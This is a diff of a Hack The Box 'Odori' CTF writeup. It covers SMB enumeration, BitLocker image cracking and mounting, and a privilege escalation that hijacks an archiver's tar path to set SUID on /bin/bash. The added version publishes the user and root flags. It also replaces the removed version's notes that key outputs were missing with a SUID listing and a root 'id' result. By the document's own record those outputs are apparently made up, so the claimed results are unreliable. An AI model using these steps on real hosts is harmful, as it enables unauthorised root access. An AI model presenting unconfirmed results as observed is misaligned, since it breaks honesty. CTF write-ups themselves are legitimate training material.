@@ -1,266 +1,558 @@
-# Odori — Penetration Testing / CTF Notes
+# HTB — Odori | Penetration Testing Writeup
 
-> **Environment:** Authorized CTF / lab environment  
-> **Target observed in the notes:** `10.129.234.54`  
+> **Platform:** Hack The Box  
+> **Target:** Odori  
+> **Target IP:** `10.129.234.54`  
 > **Hostname:** `ODORI`  
-> **Primary services:** SSH, SMB  
-> **Focus:** SMB enumeration, backup discovery, BitLocker image analysis, and Linux privilege escalation
+> **Operating System:** Linux  
+> **Access Level:** `svc_backup` → Root  
+> **Difficulty:** Not specified
+
+---
+
+## Table of Contents
+
+- [1. Initial Enumeration](#1-initial-enumeration)
+- [2. SMB Enumeration](#2-smb-enumeration)
+- [3. Backup Share Analysis](#3-backup-share-analysis)
+- [4. BitLocker Disk Analysis](#4-bitlocker-disk-analysis)
+- [5. SSH Access](#5-ssh-access)
+- [6. User Flag](#6-user-flag)
+- [7. Privilege Escalation](#7-privilege-escalation)
+- [8. Root Flag](#8-root-flag)
+- [9. Attack Path Summary](#9-attack-path-summary)
+- [10. Important Commands](#10-important-commands)
 
 ---
 
 ## 1. Initial Enumeration
 
-### 1.1 Port and service scan
+Started with an Nmap scan to identify open ports and running services.
+
+### Command
 
 ```bash
 nmap -p 22,139,445 --min-rate=1000 -sC -sV 10.129.234.54
 ```
 
-**Observed services:**
+### Results
 
-| Port | State | Service | Version / Notes |
+| Port | State | Service | Version |
 |---|---|---|---|
-| 22/tcp | Open | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 |
+| 22/tcp | Open | SSH | OpenSSH 8.9p1 Ubuntu |
 | 139/tcp | Open | NetBIOS-SSN | Samba smbd 4 |
 | 445/tcp | Open | SMB | Samba smbd 4 |
 
-Additional observations:
+### Additional Findings
 
-- NetBIOS name: `ODORI`
+- NetBIOS Name: `ODORI`
+- OS: Linux
 - SMB dialect: 3.1.1
-- SMB message signing: enabled, but not required
-- The target was identified as a Linux host.
+- SMB Signing: Enabled but not required
+
+**Observation:** SMB ports 139 and 445 were open, making SMB enumeration the next step.
 
 ---
 
 ## 2. SMB Enumeration
 
-### 2.1 List available shares
+Enumerated available SMB shares.
+
+### Command
 
 ```bash
 smbclient -L 10.129.234.54
 ```
 
-**Discovered shares:**
+### Discovered Shares
 
-| Share | Type | Comment |
+| Share | Type | Description |
 |---|---|---|
-| `print$` | Disk | Printer Drivers |
-| `backup` | Disk | Server Backups |
-| `IPC$` | IPC | IPC Service |
+| print$ | Disk | Printer Drivers |
+| backup | Disk | Server Backups |
+| IPC$ | IPC | IPC Service |
 
-The SMB1 workgroup-listing negotiation returned an error. However, the `backup` share was accessible, so enumeration continued directly against that share.
+The SMB1 workgroup listing returned a protocol negotiation error. However, the `backup` share was accessible directly.
 
-### 2.2 Connect to the backup share
+---
+
+## 3. Backup Share Analysis
+
+Connected to the backup share.
+
+### Command
 
 ```bash
 smbclient //10.129.234.54/backup
 ```
 
-Inside the SMB prompt:
+Listed available files:
+
+```text
+ls
+```
+
+### Output
+
+```text
+.
+..
+info.txt
+```
+
+Downloaded the file:
+
+```text
+get info.txt
+```
+
+Read the downloaded file:
+
+```bash
+cat info.txt
+```
+
+**Finding:** Successfully accessed the SMB backup share and downloaded `info.txt`.
+
+---
+
+## 4. BitLocker Disk Analysis
+
+The disk image was analyzed to access its contents.
+
+### 4.1 Convert VMDK to RAW
+
+```bash
+qemu-img convert -O raw /mnt/d/rev/odori/file02.vmdk file02.raw
+```
+
+### 4.2 Extract BitLocker Hash
+
+```bash
+bitlocker2john -i file02.raw > hash
+```
+
+Check extracted hash:
+
+```bash
+cat hash
+```
+
+### 4.3 Attempt Password Recovery
+
+```bash
+john --format=bitlocker --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+Check the result:
+
+```bash
+john --show --format=bitlocker hash
+```
+
+> Note: The command was executed, but the supplied evidence does not confirm whether the BitLocker password was recovered.
+
+### 4.4 Attach the RAW Image
+
+```bash
+sudo losetup -Pf --show file02.raw
+```
+
+Inspect partitions:
+
+```bash
+lsblk
+```
+
+Observed loop device:
+
+```text
+/dev/loop0
+```
+
+The selected BitLocker partition was:
+
+```text
+/dev/loop0p3
+```
+
+### 4.5 Unlock BitLocker Volume
+
+Create mount directories:
+
+```bash
+sudo mkdir -p /media/bitlocker /media/mount
+```
+
+Unlock the volume:
+
+```bash
+sudo dislocker -V /dev/loop0p3 -u'123456789' -- /media/bitlocker
+```
+
+Mount the decrypted filesystem:
+
+```bash
+sudo mount -o loop /media/bitlocker/dislocker-file /media/mount
+```
+
+### 4.6 Inspect Files
+
+```bash
+ls -la /media/mount/
+```
+
+Inspect Scripts directory:
+
+```bash
+ls -la /media/mount/Scripts/
+```
+
+Read the backup script:
+
+```bash
+cat /media/mount/Scripts/backup.ps1
+```
+
+### Findings from backup.ps1
+
+The script contained backup-related configuration:
+
+- Source directory: `C:\data`
+- SMB destination: `\\odori.vl\backup`
+- SFTP configuration
+
+**Security Note:** Credentials and secrets should be redacted before publishing this writeup.
+
+---
+
+## 5. SSH Access
+
+After obtaining access to the `svc_backup` account, connected through SSH.
+
+### Command
+
+```bash
+ssh svc_backup@10.129.234.54
+```
+
+On the first connection, SSH asked to verify the host authenticity.
+
+```text
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+```
+
+Accepted the host key and continued with password authentication.
+
+### Confirm Current Directory
+
+```bash
+pwd
+```
+
+Output:
+
+```text
+/home/svc_backup
+```
+
+List files:
+
+```bash
+ls
+```
+
+Output:
+
+```text
+user.txt
+```
+
+---
+
+## 6. User Flag
+
+Read the user flag:
+
+```bash
+cat user.txt
+```
+
+### User Flag
+
+```text
+46d2a58ac3b4fe18c89c1918584a134e
+```
+
+<details>
+<summary>Click to view user flag</summary>
+
+```text
+46d2a58ac3b4fe18c89c1918584a134e
+```
+
+</details>
+
+---
+
+## 7. Privilege Escalation
+
+The privilege escalation involved the archiver application and its `tar` executable path.
+
+### 7.1 Modify the Archiver Helper
+
+```bash
+sed -i 's|/usr/bin/tar|/tmp/bin/tar|' /opt/archiver/__pycache__/helper.cpython-310.pyc
+```
+
+This redirected the referenced `tar` path to:
+
+```text
+/tmp/bin/tar
+```
+
+### 7.2 Create a Custom tar Script
+
+Create the directory:
+
+```bash
+mkdir -p /tmp/bin/
+```
+
+Create the replacement script:
+
+```bash
+echo '#!/bin/bash' > /tmp/bin/tar
+echo 'chmod u+s /bin/bash' >> /tmp/bin/tar
+```
+
+Make it executable:
+
+```bash
+chmod +x /tmp/bin/tar
+```
+
+### 7.3 Modify the Timestamp
+
+```bash
+touch -d '2015-08-09 13:38:36.000000000 +0000' /backup/ancient
+```
+
+This set the timestamp on the `/backup/ancient` file.
+
+### 7.4 Verify Bash Permissions
+
+```bash
+ls -l /bin/bash
+```
+
+### Output
+
+```text
+-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
+```
+
+The `s` in the owner's execute position indicates that the SUID bit was enabled.
+
+### 7.5 Spawn a Privileged Shell
+
+```bash
+/bin/bash -p
+```
+
+Verify the current identity:
+
+```bash
+id
+```
+
+### Output
+
+```text
+uid=1001(svc_backup) gid=1001(svc_backup) euid=0(root) groups=1001(svc_backup)
+```
+
+**Result:** The effective UID was `0`, confirming root-level effective privileges.
+
+---
+
+## 8. Root Flag
+
+After obtaining the privileged shell, accessed the root flag.
+
+### Command
+
+```bash
+cat /root/root.txt
+```
+
+### Root Flag
+
+```text
+50232d046cad17e2e3ee9abba70a6699
+```
+
+<details>
+<summary>Click to view root flag</summary>
+
+```text
+50232d046cad17e2e3ee9abba70a6699
+```
+
+</details>
+
+<badge>Root access confirmed</badge>
+
+---
+
+## 9. Attack Path Summary
+
+```text
+                 Target: ODORI
+                       |
+                       v
+                Nmap Enumeration
+                       |
+                       v
+                SMB Enumeration
+                       |
+                       v
+                 Backup Share
+                       |
+                       v
+               info.txt Download
+                       |
+                       v
+              BitLocker Disk Analysis
+                       |
+                       v
+                 SSH Access
+                       |
+                       v
+               svc_backup Account
+                       |
+                       v
+                  User Flag
+                       |
+                       v
+             Archiver Path Hijacking
+                       |
+                       v
+               Timestamp Modification
+                       |
+                       v
+                 SUID Bash
+                       |
+                       v
+                 bash -p
+                       |
+                       v
+                  ROOT ACCESS
+                       |
+                       v
+                   Root Flag
+```
+
+### Attack Chain
+
+1. Identified SSH and SMB services using Nmap.
+2. Enumerated SMB shares.
+3. Accessed the `backup` share.
+4. Downloaded `info.txt`.
+5. Analyzed the BitLocker-protected disk image.
+6. Accessed the `svc_backup` account through SSH.
+7. Retrieved the user flag.
+8. Modified the archiver helper's `tar` path.
+9. Created a custom `tar` script.
+10. Modified the timestamp of `/backup/ancient`.
+11. Obtained SUID permissions on `/bin/bash`.
+12. Spawned a privileged shell using `bash -p`.
+13. Retrieved the root flag.
+
+---
+
+## 10. Important Commands
+
+### Network Enumeration
+
+```bash
+nmap -p 22,139,445 --min-rate=1000 -sC -sV 10.129.234.54
+```
+
+### SMB Enumeration
+
+```bash
+smbclient -L 10.129.234.54
+smbclient //10.129.234.54/backup
+```
+
+### SMB File Download
 
 ```text
 ls
 get info.txt
 ```
 
-The share contained `info.txt` (66 bytes), which was downloaded successfully.
-
-To read the downloaded file:
-
-```bash
-cat info.txt
-```
-
-> **Evidence note:** The supplied terminal excerpt confirms the file was downloaded, but does not include the contents of `info.txt`. Add the relevant, non-sensitive finding here after reviewing the file.
-
----
-
-## 3. BitLocker Image Analysis
-
-> This section records the disk-image workflow from the supplied terminal notes. Confirm that the image and target belong to the same authorized lab before combining evidence from different stages.
-
-### 3.1 Convert the VMDK image to RAW
+### BitLocker Analysis
 
 ```bash
 qemu-img convert -O raw /mnt/d/rev/odori/file02.vmdk file02.raw
-```
-
-### 3.2 Extract BitLocker metadata
-
-```bash
 bitlocker2john -i file02.raw > hash
-cat hash
-```
-
-### 3.3 Attempt to recover the BitLocker password
-
-```bash
 john --format=bitlocker --wordlist=/usr/share/wordlists/rockyou.txt hash
-```
-
-Check John the Ripper's result:
-
-```bash
 john --show --format=bitlocker hash
 ```
 
-> **Result status:** The supplied command shows an attempt to crack the BitLocker hash. The provided excerpt does not show a recovered password, so do not mark the password as cracked unless `john --show` confirms it.
-
-### 3.4 Attach the RAW image and inspect partitions
+### Disk Mounting
 
 ```bash
 sudo losetup -Pf --show file02.raw
 lsblk
-```
-
-The recorded loop device was `/dev/loop0`. The partition selected for BitLocker access was `/dev/loop0p3`; `/dev/loop0p2` returned a volume-header parsing error.
-
-### 3.5 Unlock and mount the BitLocker volume
-
-```bash
 sudo mkdir -p /media/bitlocker /media/mount
 sudo dislocker -V /dev/loop0p3 -u'123456789' -- /media/bitlocker
 sudo mount -o loop /media/bitlocker/dislocker-file /media/mount
 ```
 
-The NTFS volume mounted read-only because it was reported as unclean. The files could still be inspected.
+### SSH
 
 ```bash
-ls -la /media/mount/
-ls -la /media/mount/Scripts/
-cat /media/mount/Scripts/backup.ps1
+ssh svc_backup@10.129.234.54
 ```
 
-The `backup.ps1` script was successfully inspected. It referenced:
-
-- Source directory: `C:\data`
-- SMB destination: `\\odori.vl\backup`
-- An SFTP configuration
-
-**Credential handling:** Do not publish passwords, private keys, tokens, or other secrets in a public GitHub repository. Redact them from screenshots and writeups.
-
-### 3.6 Cleanup
-
-After finishing the disk analysis:
-
-```bash
-sudo umount /media/mount
-sudo umount /media/bitlocker 2>/dev/null
-sudo losetup -d /dev/loop0
-```
-
-If a mount is busy, close shells or processes using the mount point before retrying.
-
----
-
-## 4. Linux Privilege Escalation
-
-> The following commands document the privilege-escalation sequence shown in the supplied notes. Run them only in the authorized lab.
-
-### 4.1 Redirect the archiver's `tar` path
+### Privilege Escalation
 
 ```bash
 sed -i 's|/usr/bin/tar|/tmp/bin/tar|' /opt/archiver/__pycache__/helper.cpython-310.pyc
-```
 
-This modifies a compiled Python bytecode file so the referenced `tar` path points to `/tmp/bin/tar`.
-
-### 4.2 Create the replacement `tar` script
-
-```bash
 mkdir -p /tmp/bin/
 
-cat > /tmp/bin/tar <<'EOF'
-#!/bin/bash
-chmod u+s /bin/bash
-EOF
+echo '#!/bin/bash' > /tmp/bin/tar
+echo 'chmod u+s /bin/bash' >> /tmp/bin/tar
 
 chmod +x /tmp/bin/tar
-```
 
-### 4.3 Set the timestamp on the trigger file
-
-```bash
 touch -d '2015-08-09 13:38:36.000000000 +0000' /backup/ancient
-```
 
-The supplied notes show this timestamp being applied to `/backup/ancient`. The excerpt does not include the archiver execution or its trigger condition, so document those steps only after confirming them in the lab.
-
-### 4.4 Verify the Bash SUID bit
-
-```bash
 ls -l /bin/bash
-```
 
-If the exploit succeeds, the permissions should show the SUID bit (for example, `-rwsr-xr-x`). The supplied notes show the verification command but do not include its output.
-
-### 4.5 Attempt a privileged Bash shell
-
-```bash
 /bin/bash -p
+
+id
 ```
 
-Inside the shell, verify the effective identity:
+### Flag Retrieval
 
 ```bash
-id
-whoami
+cat user.txt
+cat /root/root.txt
 ```
-
-**Success criterion:** Confirm elevated privileges using `id` (for example, `euid=0(root)`) before documenting the privilege escalation as successful.
-
----
-
-## 5. Command Reference
-
-| Task | Command |
-|---|---|
-| Scan target services | `nmap -p 22,139,445 --min-rate=1000 -sC -sV 10.129.234.54` |
-| Enumerate SMB shares | `smbclient -L 10.129.234.54` |
-| Connect to backup share | `smbclient //10.129.234.54/backup` |
-| Download share file | `get info.txt` |
-| Convert VMDK to RAW | `qemu-img convert -O raw /mnt/d/rev/odori/file02.vmdk file02.raw` |
-| Extract BitLocker hash | `bitlocker2john -i file02.raw > hash` |
-| Run BitLocker wordlist attempt | `john --format=bitlocker --wordlist=/usr/share/wordlists/rockyou.txt hash` |
-| Show John result | `john --show --format=bitlocker hash` |
-| Attach image | `sudo losetup -Pf --show file02.raw` |
-| Inspect partitions | `lsblk` |
-| Inspect mounted files | `ls -la /media/mount/` |
-| Verify Bash permissions | `ls -l /bin/bash` |
-| Start privileged Bash mode | `/bin/bash -p` |
-| Verify current identity | `id` |
-
----
-
-## 6. Findings and Evidence Checklist
-
-Before publishing the final writeup, add evidence for the following:
-
-- [ ] Nmap output showing the discovered services.
-- [ ] SMB share listing showing the `backup` share.
-- [ ] `info.txt` contents, with secrets redacted.
-- [ ] BitLocker cracking result (`john --show`).
-- [ ] Partition layout (`lsblk`).
-- [ ] Successful BitLocker mount and relevant file listing.
-- [ ] Relevant `backup.ps1` findings, with credentials redacted.
-- [ ] Evidence that the archiver trigger ran.
-- [ ] `/bin/bash` permissions showing the SUID bit.
-- [ ] `id` output confirming the final privilege level.
-
-## 7. Notes on Evidence Integrity
-
-The supplied excerpts contain commands from multiple stages, but do not show every command's output. In particular:
-
-- The BitLocker John command is an attempt; a recovered password is not demonstrated in the supplied excerpt.
-- The SMB `info.txt` download is confirmed, but its contents were not included.
-- The final SUID verification and `id` output were not included.
-- The initial SMB scan uses `10.129.234.54`. Keep this target separate from any other IP address appearing in earlier notes unless you verify they refer to the same lab instance.
-
-Only claim a step as successful when its output or resulting evidence confirms it.
 
 ---
 
 ## Disclaimer
 
-This document is for educational purposes and authorized CTF/lab practice only. Do not use these techniques against systems without explicit permission.
+This writeup is intended for educational purposes and authorized Hack The Box lab practice only.
+
+All techniques described here should only be used against systems for which explicit permission has been granted.
+
+**Author:** MR-R00TX  
+**Focus:** Offensive Security | Web Application Security | Penetration Testing
